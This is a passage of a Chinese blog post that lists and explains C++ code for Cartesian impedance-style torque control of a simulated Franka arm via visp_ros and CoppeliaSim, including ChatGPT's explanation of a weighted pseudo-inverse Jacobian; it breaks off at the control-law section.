    <content type="html"><![CDATA[<span id="more"></span><h2 id="代码">代码</h2><p>先把代码贴上来，后面进行总结，同时结合chatgpt记录一下其中的数学原理。<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;visp_ros/vpROSRobotFrankaCoppeliasim.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;base_tool_func.h&quot;</span></span><br><br>symc::SystemInfo sys_info;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span></span>&#123;<br>    symc::OptSettings opt_settings;<br>    <span class="hljs-keyword">if</span>(symc::<span class="hljs-built_in">ArgHandle</span>(argc, argv, opt_settings) == <span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">return</span> EXIT_SUCCESS;<br>    &#125;<br>    symc::SignalManager::<span class="hljs-built_in">RegisterSignalHandlers</span>();<br>    vpROSRobotFrankaCoppeliasim robot;<br>    <span class="hljs-keyword">try</span>&#123;<br>        ros::<span class="hljs-built_in">init</span>(argc, argv, <span class="hljs-string">&quot;visp_ros&quot;</span>, ros::init_options::NoSigintHandler);<br>        ros::NodeHandlePtr n = boost::<span class="hljs-built_in">make_shared</span>&lt;ros::NodeHandle&gt;();<br>        <span class="hljs-function">ros::Rate <span class="hljs-title">loop_rate</span><span class="hljs-params">(<span class="hljs-number">1000</span>)</span></span>;<br>        ros::<span class="hljs-built_in">spinOnce</span>();<br>        robot.<span class="hljs-built_in">setVerbose</span>(opt_settings.verbose);<br>        robot.<span class="hljs-built_in">connect</span>();<br>        symc::<span class="hljs-built_in">ResetSimulation</span>(robot);<br><br>        <span class="hljs-function">vpColVector <span class="hljs-title">q_init</span><span class="hljs-params">( &#123; <span class="hljs-number">0</span>, vpMath::rad( <span class="hljs-number">-45</span> ), <span class="hljs-number">0</span>, vpMath::rad( <span class="hljs-number">-135</span> ), <span class="hljs-number">0</span>, vpMath::rad( <span class="hljs-number">90</span> ), vpMath::rad( <span class="hljs-number">45</span> ) &#125; )</span></span>;<br>        symc::<span class="hljs-built_in">InitRobotPosition</span>(robot, q_init);<br><br>        <span class="hljs-function">vpColVector <span class="hljs-title">q</span><span class="hljs-params">(<span class="hljs-number">7</span>,<span class="hljs-number">0</span>)</span></span>; <span class="hljs-comment">// joint position</span><br>        <span class="hljs-function">vpColVector <span class="hljs-title">q_dot</span><span class="hljs-params">(<span class="hljs-number">7</span>,<span class="hljs-number">0</span>)</span></span>; <span class="hljs-comment">// joint velocity</span><br>        <span class="hljs-function">vpColVector <span class="hljs-title">x_error</span><span class="hljs-params">(<span class="hljs-number">6</span>,<span class="hljs-number">0</span>)</span></span>; <span class="hljs-comment">// position error in cartesian space</span><br>        <span class="hljs-function">vpColVector <span class="hljs-title">x_dot_error</span><span class="hljs-params">(<span class="hljs-number">6</span>,<span class="hljs-number">0</span>)</span></span>; <span class="hljs-comment">// velocity error in cartesian space</span><br>        <span class="hljs-function">vpColVector <span class="hljs-title">x_dot_desired</span><span class="hljs-params">(<span class="hljs-number">6</span>,<span class="hljs-number">0</span>)</span></span>; <span class="hljs-comment">// desired cartesian velocity</span><br>        <span class="hljs-function">vpColVector <span class="hljs-title">x_dot_dot_desired</span><span class="hljs-params">(<span class="hljs-number">6</span>,<span class="hljs-number">0</span>)</span></span>; <span class="hljs-comment">// desired cartesian acceleration</span><br>        <span class="hljs-function">vpColVector <span class="hljs-title">C</span><span class="hljs-params">(<span class="hljs-number">7</span>,<span class="hljs-number">0</span>)</span></span>; <span class="hljs-comment">// Coriolis and centrifugal forces</span><br>        <span class="hljs-function">vpColVector <span class="hljs-title">F</span><span class="hljs-params">(<span class="hljs-number">7</span>,<span class="hljs-number">0</span>)</span></span>; <span class="hljs-comment">// friction forces</span><br><br>        <span class="hljs-function">vpColVector <span class="hljs-title">tau0</span><span class="hljs-params">(<span class="hljs-number">7</span>,<span class="hljs-number">0</span>)</span></span>; <span class="hljs-comment">// initial joint torque</span><br>        <span class="hljs-function">vpColVector <span class="hljs-title">tau</span><span class="hljs-params">(<span class="hljs-number">7</span>,<span class="hljs-number">0</span>)</span></span>; <span class="hljs-comment">// joint torque</span><br>        <span class="hljs-function">vpColVector <span class="hljs-title">tau_desired</span><span class="hljs-params">(<span class="hljs-number">7</span>,<span class="hljs-number">0</span>)</span></span>; <span class="hljs-comment">// desired joint torque</span><br>        <span class="hljs-function">vpColVector <span class="hljs-title">tau_cmd</span><span class="hljs-params">(<span class="hljs-number">7</span>,<span class="hljs-number">0</span>)</span></span>; <span class="hljs-comment">// joint torque command</span><br><br>        <span class="hljs-function">vpMatrix <span class="hljs-title">fJe</span><span class="hljs-params">(<span class="hljs-number">6</span>,<span class="hljs-number">7</span>)</span></span>; <span class="hljs-comment">// Jacobian matrix in operational frame</span><br>        <span class="hljs-function">vpMatrix <span class="hljs-title">Ja</span><span class="hljs-params">(<span class="hljs-number">6</span>,<span class="hljs-number">7</span>)</span></span>; <span class="hljs-comment">// Jacobian matrix in world frame</span><br>        <span class="hljs-function">vpMatrix <span class="hljs-title">Ja_dot</span><span class="hljs-params">(<span class="hljs-number">6</span>,<span class="hljs-number">7</span>)</span></span>; <span class="hljs-comment">// Jacobian matrix derivative</span><br>        <span class="hljs-function">vpMatrix <span class="hljs-title">Ja_old</span><span class="hljs-params">(<span class="hljs-number">6</span>,<span class="hljs-number">7</span>)</span></span>; <span class="hljs-comment">// old Jacobian matrix</span><br>        <span class="hljs-function">vpMatrix <span class="hljs-title">B</span><span class="hljs-params">(<span class="hljs-number">7</span>,<span class="hljs-number">7</span>)</span></span>; <span class="hljs-comment">// joint space inertia matrix in cartesian space</span><br>        <span class="hljs-function">vpMatrix <span class="hljs-title">I7</span><span class="hljs-params">(<span class="hljs-number">7</span>,<span class="hljs-number">7</span>)</span></span>; <span class="hljs-comment">// identity matrix</span><br>        <span class="hljs-function">vpMatrix <span class="hljs-title">Ja_pinv_B_t</span><span class="hljs-params">(<span class="hljs-number">7</span>,<span class="hljs-number">6</span>)</span></span>; <span class="hljs-comment">// pseudo-inverse of the Jacobian matrix multiplied by the inertia matrix</span><br>        I<span class="hljs-number">7.</span><span class="hljs-built_in">eye</span>();<br>        &#123;<br>            robot.<span class="hljs-built_in">getPosition</span>(vpRobot::JOINT_STATE, q);<br>            std::cout&lt;&lt;<span class="hljs-string">&quot;Initial joint position: &quot;</span>&lt;&lt;q.<span class="hljs-built_in">t</span>()&lt;&lt;std::endl;<br>        &#125;<br>        robot.<span class="hljs-built_in">setRobotState</span>(vpRobot::STATE_FORCE_TORQUE_CONTROL);<br>        robot.<span class="hljs-built_in">setCoppeliasimSyncMode</span>(opt_settings.coppeliasim_sync_mode);<br><br>        vpHomogeneousMatrix fMed, fMed0, fMe;<br>        fMed = fMed0 = robot.<span class="hljs-built_in">get_fMe</span>(); <span class="hljs-comment">// get end-effector pose</span><br><br>        <span class="hljs-function">vpMatrix <span class="hljs-title">K</span><span class="hljs-params">(<span class="hljs-number">6</span>,<span class="hljs-number">6</span>)</span></span>;<br>        <span class="hljs-function">vpMatrix <span class="hljs-title">D</span><span class="hljs-params">(<span class="hljs-number">6</span>,<span class="hljs-number">6</span>)</span></span>;<br>        <span class="hljs-function">vpMatrix <span class="hljs-title">edVf</span><span class="hljs-params">(<span class="hljs-number">6</span>,<span class="hljs-number">6</span>)</span></span>; <span class="hljs-comment">// rotation matrix from operational frame to world frame(linear velocity and angular velocity)</span><br><br>        <span class="hljs-type">double</span> wp = <span class="hljs-number">50.0</span>; <span class="hljs-comment">// position control gain</span><br>        <span class="hljs-type">double</span> wo = <span class="hljs-number">20.0</span>; <span class="hljs-comment">// orientation control gain</span><br><br>        K.<span class="hljs-built_in">diag</span>(&#123;wp*wp, wp*wp, wp*wp, wo*wo, wo*wo, wo*wo&#125;);<br>        D.<span class="hljs-built_in">diag</span>(&#123;<span class="hljs-number">2</span>*wp, <span class="hljs-number">2</span>*wp, <span class="hljs-number">2</span>*wp, <span class="hljs-number">2</span>*wo, <span class="hljs-number">2</span>*wo, <span class="hljs-number">2</span>*wo&#125;);<br>        <span class="hljs-type">double</span> mu = <span class="hljs-number">0.1</span>; <span class="hljs-comment">// friction coefficient</span><br><br>        std::cout&lt;&lt;<span class="hljs-string">&quot;--Init finished. Press ctrl c to exit--&quot;</span>&lt;&lt;std::endl;<br><br>        <span class="hljs-keyword">while</span>(!symc::SignalManager::<span class="hljs-built_in">ShouldExit</span>())&#123;<br>            robot.<span class="hljs-built_in">getPosition</span>(vpRobot::JOINT_STATE, q);<br>            robot.<span class="hljs-built_in">getVelocity</span>(vpRobot::JOINT_STATE, q_dot);<br>            robot.<span class="hljs-built_in">getMass</span>(B);<br>            robot.<span class="hljs-built_in">getCoriolis</span>(C);<br>            robot.<span class="hljs-built_in">getFriction</span>(F);<br>            robot.<span class="hljs-built_in">get_fJe</span>(fJe); <span class="hljs-comment">// get Jacobian matrix in operational frame</span><br>            robot.<span class="hljs-built_in">getForceTorque</span>(vpRobot::JOINT_STATE, tau);<br>            <br>            fMed[<span class="hljs-number">1</span>][<span class="hljs-number">3</span>] = fMed0[<span class="hljs-number">1</span>][<span class="hljs-number">3</span>] + (sys_info.is_trajectory_started_ ? ( <span class="hljs-number">0.1</span> * <span class="hljs-built_in">sin</span>( <span class="hljs-number">2</span> * M_PI * <span class="hljs-number">0.3</span> * (sys_info.time_current_ - sys_info.time_start_trajectory_))) : <span class="hljs-number">0</span> );<br>            fMed[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>] = fMed0[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>] - (sys_info.is_trajectory_started_ ? ( <span class="hljs-number">0.05</span> * <span class="hljs-built_in">sin</span>( <span class="hljs-number">2</span> * M_PI * <span class="hljs-number">0.6</span> * (sys_info.time_current_ - sys_info.time_start_trajectory_))) : <span class="hljs-number">0</span>) ;<br>            x_dot_desired[<span class="hljs-number">1</span>] = (sys_info.is_trajectory_started_ ? (<span class="hljs-number">2</span> * M_PI * <span class="hljs-number">0.3</span> * <span class="hljs-number">0.1</span> * <span class="hljs-built_in">cos</span>( <span class="hljs-number">2</span> * M_PI * <span class="hljs-number">0.3</span> * (sys_info.time_current_ - sys_info.time_start_trajectory_))) : <span class="hljs-number">0</span>) ;<br>            x_dot_desired[<span class="hljs-number">2</span>] = (sys_info.is_trajectory_started_ ? (<span class="hljs-number">-2</span> * M_PI * <span class="hljs-number">0.6</span> * <span class="hljs-number">0.05</span> * <span class="hljs-built_in">cos</span>( <span class="hljs-number">2</span> * M_PI * <span class="hljs-number">0.6</span> * (sys_info.time_current_ - sys_info.time_start_trajectory_))) : <span class="hljs-number">0</span>) ;<br><br>            x_dot_dot_desired[<span class="hljs-number">1</span>] = (sys_info.is_trajectory_started_ ? (<span class="hljs-number">-2</span> * M_PI * <span class="hljs-number">0.3</span> * <span class="hljs-number">2</span> * M_PI * <span class="hljs-number">0.3</span> * <span class="hljs-number">0.1</span> * <span class="hljs-built_in">sin</span>( <span class="hljs-number">2</span> * M_PI * <span class="hljs-number">0.3</span> * (sys_info.time_current_ - sys_info.time_start_trajectory_))) : <span class="hljs-number">0</span>) ;<br>            x_dot_dot_desired[<span class="hljs-number">2</span>] = (sys_info.is_trajectory_started_ ? (<span class="hljs-number">2</span> * M_PI * <span class="hljs-number">0.6</span> * <span class="hljs-number">2</span> * M_PI * <span class="hljs-number">0.6</span> * <span class="hljs-number">0.05</span> * <span class="hljs-built_in">sin</span>( <span class="hljs-number">2</span> * M_PI * <span class="hljs-number">0.6</span> * (sys_info.time_current_ - sys_info.time_start_trajectory_))) : <span class="hljs-number">0</span>) ;<br><br>            edVf.<span class="hljs-built_in">insert</span>(fMed.<span class="hljs-built_in">getRotationMatrix</span>().<span class="hljs-built_in">t</span>(), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>            edVf.<span class="hljs-built_in">insert</span>(fMed.<span class="hljs-built_in">getRotationMatrix</span>().<span class="hljs-built_in">t</span>(), <span class="hljs-number">3</span>, <span class="hljs-number">3</span>);<br>            <br><br>            fMe = robot.<span class="hljs-built_in">get_fMe</span>(); <span class="hljs-comment">// get end-effector pose</span><br>            vpPoseVector pose_error = <span class="hljs-built_in">static_cast</span>&lt;vpPoseVector&gt;(fMed.<span class="hljs-built_in">inverse</span>() * fMe); <span class="hljs-comment">// get error in cartesian space</span><br>            <br><br>            vpMatrix La = symc::<span class="hljs-built_in">Ta</span>(pose_error); <span class="hljs-comment">// compute Lie algebra</span><br>            <span class="hljs-comment">//<span class="hljs-doctag">TODO:</span>La*edVf is the matrix that can transform the velocity in operational frame to the velocity in world frame?</span><br>            Ja = La*edVf*fJe; <span class="hljs-comment">// compute Jacobian matrix in world frame</span><br>            <span class="hljs-keyword">if</span>(!symc::<span class="hljs-built_in">IsEqual</span>(sys_info.dt_, <span class="hljs-number">0</span>))&#123;<br>                Ja_dot = (Ja - Ja_old) / sys_info.dt_;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                Ja_dot = <span class="hljs-number">0</span>;<br>            &#125;<br>            Ja_old = Ja;<br>            <span class="hljs-comment">// weighted pseudo-inverse of the Jacobian matrix</span><br>            <span class="hljs-comment">// to optimize the control performance ?</span><br>            <span class="hljs-comment">// or to avoid singularity ?</span><br>            <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span>the formula is from the paper:</span><br>            Ja_pinv_B_t = (Ja * B.<span class="hljs-built_in">inverseByCholesky</span>()*Ja.<span class="hljs-built_in">t</span>()).<span class="hljs-built_in">inverseByCholesky</span>()*Ja*B.<span class="hljs-built_in">inverseByCholesky</span>();<br>            <br>            <span class="hljs-comment">// compute desired joint torque</span><br>            x_error = <span class="hljs-built_in">static_cast</span>&lt;vpColVector&gt;(pose_error); <span class="hljs-comment">// compute error in cartesian space</span><br>            x_dot_error = La*edVf*(x_dot_desired - fJe*q_dot); <span class="hljs-comment">// compute velocity error in cartesian space</span><br>            <span class="hljs-comment">// formula: tau = M(q)*q_dot_dot + C(q,q_dot) + F(q_dot) + G(q)</span><br>            <span class="hljs-comment">// Ja.pseudoInverse is the inverse of the Jacobian matrix</span><br>            <span class="hljs-comment">// which can transform cartesian space to joint space</span><br>            vpMatrix control_law = (-K*(x_error)+D*(x_dot_error)-Ja_dot*q_dot + x_dot_dot_desired);<br>            tau_desired = B*Ja.<span class="hljs-built_in">pseudoInverse</span>()* control_law + C + F - (I7 - Ja.<span class="hljs-built_in">t</span>()*Ja_pinv_B_t)*B*q_dot*<span class="hljs-number">100</span>;<br>            <span class="hljs-comment">// tau_desired = B*Ja.pseudoInverse()* control_law + C + F;</span><br>            <span class="hljs-keyword">if</span>(sys_info.is_first_)&#123;<br>                tau0 = tau_desired;<br>            &#125;<br>            tau_cmd = tau_desired - tau0*std::<span class="hljs-built_in">exp</span>(-mu*sys_info.time_current_ - sys_info.time_start_trajectory_);<br><br>            <span class="hljs-comment">// apply the desired joint torque</span><br>            robot.<span class="hljs-built_in">setForceTorque</span>(vpRobot::JOINT_STATE, tau_cmd);<br><br>            <span class="hljs-keyword">if</span>(opt_settings.verbose)&#123;<br>                std::cout&lt;&lt;<span class="hljs-string">&quot;dt: &quot;</span>&lt;&lt;sys_info.dt_&lt;&lt;std::endl;<br>            &#125;<br>            robot.<span class="hljs-built_in">wait</span>(sys_info.time_current_, <span class="hljs-number">0.001</span>); <span class="hljs-comment">// Sync loop at 1000 Hz (1 ms)</span><br>            sys_info.<span class="hljs-built_in">UpdateTime</span>(robot);<br>        &#125;<br>        symc::<span class="hljs-built_in">StopSimulation</span>(robot);<br>    &#125;<span class="hljs-built_in">catch</span>(<span class="hljs-type">const</span> vpException&amp; e)&#123;<br>        std::cout&lt;&lt;<span class="hljs-string">&quot;Catch an exception: &quot;</span>&lt;&lt;e.<span class="hljs-built_in">what</span>()&lt;&lt;std::endl;<br>        symc::<span class="hljs-built_in">StopSimulation</span>(robot);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;--Exited--&quot;</span>&lt;&lt;std::endl;<br>    <span class="hljs-keyword">return</span> EXIT_SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure></p><h2 id="总结及推导">总结及推导</h2><h3 id="说明">说明</h3><p>这里直接跳过不太重要的部分，从字面意思即可理解其作用，重点说明while循环内的内容。</p><ul><li><p>下面以base frame指代基坐标系（位姿），end-effectorframe指代末端执行器坐标系（位姿），因为Homogeneous TransformationMatrix既可以表示变换也可以表示位姿，所以后面就不特意说明是位姿还是变换操作了。</p></li><li><p>用task space(cartesianspace)指代任务空间（也就是笛卡尔空间），用jointspace指代关节空间。</p></li></ul><p>下面逐行进行解释。</p><h3 id="初始化">初始化</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp">robot.<span class="hljs-built_in">getPosition</span>(vpRobot::JOINT_STATE, q);<br>robot.<span class="hljs-built_in">getVelocity</span>(vpRobot::JOINT_STATE, q_dot);<br>robot.<span class="hljs-built_in">getMass</span>(B);<br>robot.<span class="hljs-built_in">getCoriolis</span>(C);<br>robot.<span class="hljs-built_in">getFriction</span>(F);<br>robot.<span class="hljs-built_in">get_fJe</span>(fJe);<br>robot.<span class="hljs-built_in">getForceTorque</span>(vpRobot::JOINT_STATE, tau);<br><br></code></pre></td></tr></table></figure><p>这里通过调用visp_ros的接口获取franka的信息，其中：<br />* <em>getMass()</em> 指获取质量矩阵(inertia matrix, 惯性矩阵)<br />* <em>getCoriolis()</em> 指获取科里奥利力矩阵<br />* <em>getFriction()</em> 指获取摩擦力矩阵<br />* <em>get_fJe()</em> 指获取雅可比矩阵(Jacobianmatrix)，注意这里是关节空间下的雅可比矩阵</p><p>其他根据字面意思理解即可。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp">fMed[<span class="hljs-number">1</span>][<span class="hljs-number">3</span>] = fMed0[<span class="hljs-number">1</span>][<span class="hljs-number">3</span>] + (sys_info.is_trajectory_started_ ? ( <span class="hljs-number">0.1</span> * <span class="hljs-built_in">sin</span>( <span class="hljs-number">2</span> * M_PI * <span class="hljs-number">0.3</span> * (sys_info.time_current_ - sys_info.time_start_trajectory_))) : <span class="hljs-number">0</span> );<br>fMed[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>] = fMed0[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>] - (sys_info.is_trajectory_started_ ? ( <span class="hljs-number">0.05</span> * <span class="hljs-built_in">sin</span>( <span class="hljs-number">2</span> * M_PI * <span class="hljs-number">0.6</span> * (sys_info.time_current_ - sys_info.time_start_trajectory_))) : <span class="hljs-number">0</span>) ;<br>x_dot_desired[<span class="hljs-number">1</span>] = (sys_info.is_trajectory_started_ ? (<span class="hljs-number">2</span> * M_PI * <span class="hljs-number">0.3</span> * <span class="hljs-number">0.1</span> * <span class="hljs-built_in">cos</span>( <span class="hljs-number">2</span> * M_PI * <span class="hljs-number">0.3</span> * (sys_info.time_current_ - sys_info.time_start_trajectory_))) : <span class="hljs-number">0</span>) ;<br>x_dot_desired[<span class="hljs-number">2</span>] = (sys_info.is_trajectory_started_ ? (<span class="hljs-number">-2</span> * M_PI * <span class="hljs-number">0.6</span> * <span class="hljs-number">0.05</span> * <span class="hljs-built_in">cos</span>( <span class="hljs-number">2</span> * M_PI * <span class="hljs-number">0.6</span> * (sys_info.time_current_ - sys_info.time_start_trajectory_))) : <span class="hljs-number">0</span>) ;<br><br>x_dot_dot_desired[<span class="hljs-number">1</span>] = (sys_info.is_trajectory_started_ ? (<span class="hljs-number">-2</span> * M_PI * <span class="hljs-number">0.3</span> * <span class="hljs-number">2</span> * M_PI * <span class="hljs-number">0.3</span> * <span class="hljs-number">0.1</span> * <span class="hljs-built_in">sin</span>( <span class="hljs-number">2</span> * M_PI * <span class="hljs-number">0.3</span> * (sys_info.time_current_ - sys_info.time_start_trajectory_))) : <span class="hljs-number">0</span>) ;<br>x_dot_dot_desired[<span class="hljs-number">2</span>] = (sys_info.is_trajectory_started_ ? (<span class="hljs-number">2</span> * M_PI * <span class="hljs-number">0.6</span> * <span class="hljs-number">2</span> * M_PI * <span class="hljs-number">0.6</span> * <span class="hljs-number">0.05</span> * <span class="hljs-built_in">sin</span>( <span class="hljs-number">2</span> * M_PI * <span class="hljs-number">0.6</span> * (sys_info.time_current_ - sys_info.time_start_trajectory_))) : <span class="hljs-number">0</span>) ;<br><br></code></pre></td></tr></table></figure><p>设定参考轨迹，也就是目标轨迹，fMed,fMed0均是<em>vpHomogeneousMatrix</em>类型fMed[4][4]的index先是行再是列，与矩阵表示习惯相同。<br />这里贴一下<em>vpHomogeneousMatrix</em>类型的部分源码注释：</p><p>The class provides a data structure for the homogeneous matrices aswell as a set of operations on these matrices.</p><p>The vpHomogeneousMatrix class is derived fromvpArray2D&lt;double&gt;.</p><p>An homogeneous matrix is 4x4 matrix defines as <spanclass="math display">\[\left[^a{\bf M}_b = \left(\begin{array}{cc}^a{\bf R}_b &amp; ^a{\bf t}_b \\{\bf 0}_{1\times 3} &amp; 1\end{array}\right)\right]\]</span><br />that defines the position of frame <em>b</em> in frame <em>a</em></p><p><span class="math inline">\(^a{R}_b\)</span> is a rotation matrix and<span class="math inline">\(^a{t}_b\)</span> is a translationvector.</p><h3 id="矩阵更新">矩阵更新</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">edVf.<span class="hljs-built_in">insert</span>(fMed.<span class="hljs-built_in">getRotationMatrix</span>().<span class="hljs-built_in">t</span>(), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>edVf.<span class="hljs-built_in">insert</span>(fMed.<span class="hljs-built_in">getRotationMatrix</span>().<span class="hljs-built_in">t</span>(), <span class="hljs-number">3</span>, <span class="hljs-number">3</span>);<br></code></pre></td></tr></table></figure><p>TODO:这个没懂是干啥的，后面待补充。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">fMe = robot.<span class="hljs-built_in">get_fMe</span>();<br>vpPoseVector pose_error = <span class="hljs-built_in">static_cast</span>&lt;vpPoseVector&gt;(fMed.<span class="hljs-built_in">inverse</span>() * fMe);<br></code></pre></td></tr></table></figure><p>通过 <em>get_fMe()</em> 获取franka的姿态(Homogeneous transformationmatrix)，然后计算与目标位姿的误差，fMed是上面设置的目标位姿。<br />为什么 <em>fMed.inverse() * fMe</em>得到的就是位姿误差？这里我的理解是fMed的形式应该是<spanclass="math inline">\(^{B}T_{D}\)</span>(目标位姿相对基坐标系)，fMe的形式<spanclass="math inline">\({B}T_{E}\)</span>(末端执行器位姿相对基坐标系)，通过左乘变换矩阵将fMe转换到目标坐标系下，即末端执行器相对目标坐标系的位姿表示，得到的即是位姿误差。<br />//TODO:这里理解可能是错误的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp">vpMatrix La = symc::<span class="hljs-built_in">Ta</span>(pose_error);<br>Ja = La*edVf*fJe;<br><span class="hljs-keyword">if</span>(!symc::<span class="hljs-built_in">IsEqual</span>(sys_info.dt_, <span class="hljs-number">0</span>))&#123;<br>    Ja_dot = (Ja - Ja_old) / sys_info.dt_;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    Ja_dot = <span class="hljs-number">0</span>;<br>&#125;<br>Ja_old = Ja;<br></code></pre></td></tr></table></figure><p>通过 <em>Ta</em>函数输入的齐次变换矩阵（代表末端执行器位姿），计算李代数，李代数是用来表示变换群（如SO(3)和SE(3)）的无穷小变换（即微分形式）。返回的是6x6 的李代数矩阵，它表示了当前末端执行器位姿对应的微分变换。<br /><strong>它的作用是用于将6维的刚体运动（速度、力）从一个坐标系转换到另一个坐标系</strong><br />然后计算雅可比矩阵（Ja），<strong>注意fJe是上面获取的关节空间下的雅可比矩阵</strong>，通过左乘La*edVf将其转换到笛卡尔空间下，得到笛卡尔空间下的雅可比矩阵Ja。<br /><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">Ja_pinv_B_t = (Ja * B.<span class="hljs-built_in">inverseByCholesky</span>()*Ja.<span class="hljs-built_in">t</span>()).<span class="hljs-built_in">inverseByCholesky</span>()*Ja*B.<span class="hljs-built_in">inverseByCholesky</span>();<br></code></pre></td></tr></table></figure></p><p>没看懂，根据chatgpt的说法，Ja_pinv_B_t是加权伪逆雅可比矩阵，其公式就是：<br /><span class="math display">\[Ja\_pinv\_B\_t=(Ja \cdot {B^{−1}}\cdotJa^{T})^{-1}\cdot Ja\cdot B^{-1}\]</span><br />贴一下它的解释：<br />这个表达式 Ja_pinv_B_t 是计算 加权伪逆雅可比矩阵的一种方式。加权伪逆（weightedpseudoinverse）是用于解决欠定或超定系统中的伪逆运算，其中矩阵不一定是方阵，且需要考虑特定权重。<br />伪逆雅可比矩阵在控制和运动学中用于求解欠定或冗余系统的逆运动学问题。在这种情况下，加权伪逆通过矩阵通过矩阵B引入了权重，使得解空间能够根据特定的权重进行优化。<br />加权伪逆的常见应用：<br />* 关节空间中的优化控制。<br />* 处理机器人冗余度时平衡关节的不同能量消耗或限制。<br />* 最小化在任务空间中实现运动时，关节空间中的力或速度。</p><p>该表达式通过Cholesky分解计算了加权伪逆雅可比矩阵。其目的是：<br />* 利用矩阵𝐵对雅可比矩阵进行加权，优化运动控制或冗余度处理。<br />* 使用Cholesky分解提升了计算效率，适用于正定对称矩阵𝐵的情境。</p><p>最终，Ja_pinv_B_t是雅可比矩阵的加权伪逆，它在机器人控制和运动学求解中用于优化和解决欠定或冗余问题。</p><h3 id="计算控制律">计算控制律</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 